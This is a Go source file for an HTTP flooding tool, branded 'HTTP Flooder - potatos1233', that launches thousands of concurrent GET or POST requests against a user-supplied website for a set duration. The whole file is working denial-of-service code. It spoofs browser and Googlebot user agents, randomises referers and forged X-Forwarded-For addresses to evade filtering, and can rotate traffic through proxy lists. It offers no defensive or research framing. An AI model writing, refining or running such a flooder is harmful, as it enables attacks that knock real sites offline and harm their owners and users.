package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var (
	host       = ""
	port       = "80"
	page       = ""
	mode       = ""
	abcd       = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM0123456789"
	start      = make(chan bool)
	key        string
	proxies    []string
	useProxies = false

	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate, br\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml\r\n",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	}

	choice  = []string{"Macintosh", "Windows", "X11", "Android", "iPhone"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64", "Linux armv7l", "Linux aarch64"}
	choice5 = []string{"chrome", "spider", "ie", "firefox", "safari"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}

	spider = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}

	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.reddit.com/search/?q=",
		"https://www.twitter.com/search?q=",
		"https://www.amazon.com/s?k=",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func randomString(length int) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = abcd[rand.Intn(len(abcd))]
	}
	return string(b)
}

func getuseragent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	switch platform {
	case "Macintosh":
		os = choice2[rand.Intn(len(choice2))]
	case "Windows":
		os = choice3[rand.Intn(len(choice3))]
	case "X11":
		os = choice4[rand.Intn(len(choice4))]
	case "Android":
		os = "Linux; Android " + strconv.Itoa(rand.Intn(14)+4) + "; Mobile"
	case "iPhone":
		os = "iPhone; CPU iPhone OS " + strconv.Itoa(rand.Intn(6)+12) + "_" + strconv.Itoa(rand.Intn(4)) + " like Mac OS X"
	}

	browser := choice5[rand.Intn(len(choice5))]
	switch browser {
	case "chrome":
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	case "firefox":
		ver := strconv.Itoa(rand.Intn(99)) + ".0"
		return "Mozilla/5.0 (" + os + "; rv:" + ver + ") Gecko/20100101 Firefox/" + ver
	case "safari":
		webkit := strconv.Itoa(rand.Intn(699-600)+600) + "." + strconv.Itoa(rand.Intn(99)) + "." + strconv.Itoa(rand.Intn(99))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + " (KHTML, like Gecko) Version/" + strconv.Itoa(rand.Intn(16)+4) + ".0 Safari/" + webkit
	case "ie":
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		token := ""
		if rand.Intn(2) == 1 {
			token = choice6[rand.Intn(len(choice6))] + "; "
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func buildHeader(addr string, customFile string) string {
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: " + addr + "\r\n"
		if customFile == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += "Referer: " + referers[rand.Intn(len(referers))] + randomString(20) + "\r\n"
			header += "X-Forwarded-For: " + strconv.Itoa(rand.Intn(256)) + "." + strconv.Itoa(rand.Intn(256)) + "." + strconv.Itoa(rand.Intn(256)) + "." + strconv.Itoa(rand.Intn(256)) + "\r\n"
		} else {
			fi, err := os.Open(customFile)
			if err != nil {
				fmt.Printf("Error: %s\n", err)
				return header
			}
			defer fi.Close()
			br := bufio.NewReader(fi)
			for {
				a, _, c := br.ReadLine()
				if c == io.EOF {
					break
				}
				header += string(a) + "\r\n"
			}
		}
	} else if mode == "post" {
		data := randomString(rand.Intn(500) + 100)
		if customFile != "nil" {
			fi, err := os.Open(customFile)
			if err != nil {
				fmt.Printf("Error: %s\n", err)
				return header
			}
			defer fi.Close()
			br := bufio.NewReader(fi)
			for {
				a, _, c := br.ReadLine()
				if c == io.EOF {
					break
				}
				header += string(a) + "\r\n"
			}
		} else {
			header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
			header += "Connection: Keep-Alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += "Referer: " + referers[rand.Intn(len(referers))] + randomString(20) + "\r\n"
			header += "\r\n" + data + "\r\n"
		}
	}
	return header
}

func dialTarget(addr string) net.Conn {
	if useProxies && len(proxies) > 0 {
		proxy := proxies[rand.Intn(len(proxies))]
		conn, err := net.Dial("tcp", proxy)
		if err != nil {
			return nil
		}

		fmt.Fprintf(conn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)
		buf := make([]byte, 1024)
		conn.Read(buf)
		return conn
	}

	if port == "443" {
		cfg := &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
			ClientSessionCache: tls.NewLRUClientSessionCache(128),
		}
		conn, err := tls.Dial("tcp", addr, cfg)
		if err != nil {
			return nil
		}
		return conn
	}

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return nil
	}

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
	}

	return conn
}

func floodWorker(id int, addr string, header string) {
	<-start

	for {
		conn := dialTarget(addr)
		if conn == nil {
			continue
		}

		for {
			request := ""
			if mode == "get" {
				request = "GET " + page + key + randomString(rand.Intn(100)+50) + "=" + randomString(rand.Intn(200)+100)
			} else {
				request = "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
			}
			request += header + "\r\n"

			_, err := conn.Write([]byte(request))
			if err != nil {
				conn.Close()
				break
			}
		}
	}
}

func main() {
	fmt.Println(`
    HTTP Flooder - potatos1233
	°ᜊ°     
	`)

	if len(os.Args) != 6 && len(os.Args) != 7 {
		fmt.Println("Usage: go run ratline.go <url> <threads> <get/post> <seconds> <header.txt/nil> [proxy.txt]")
		fmt.Println("Example: go run ratline.go site.com 1000 get 60 nil")
		fmt.Println("Example with proxies: go run ratline.go site.com 1000 get 120 nil proxies.txt")
		os.Exit(1)
	}

	u, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println("Invalid URL")
		os.Exit(1)
	}

	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if page == "" {
		page = "/"
	}

	mode = os.Args[3]
	if mode != "get" && mode != "post" {
		fmt.Println("Mode must be 'get' or 'post'")
		os.Exit(1)
	}

	threads, _ := strconv.Atoi(os.Args[2])
	limit, _ := strconv.Atoi(os.Args[4])
	customFile := os.Args[5]

	if strings.Contains(page, "?") {
		key = "&"
	} else {
		key = "?"
	}

	if len(os.Args) == 7 {
		proxyFile := os.Args[6]
		data, err := os.ReadFile(proxyFile)
		if err == nil {
			proxies = strings.Split(string(data), "\n")
			useProxies = true
			fmt.Printf("Loaded %d proxies\n", len(proxies))
		}
	}

	addr := host + ":" + port
	header := buildHeader(addr, customFile)

	var rlimit syscall.Rlimit
	syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rlimit)
	rlimit.Cur = rlimit.Max
	syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rlimit)

	for i := 0; i < threads; i++ {
		go floodWorker(i, addr, header)
	}

	fmt.Printf("Target: %s | Threads: %d | Duration: %ds\n", addr, threads, limit)
	fmt.Println("Press ENTER")

	bufio.NewReader(os.Stdin).ReadString('\n')
	close(start)

	fmt.Printf("Flood active for %d seconds...\n", limit)
	time.Sleep(time.Duration(limit) * time.Second)
	fmt.Println("Flood complete.")
}
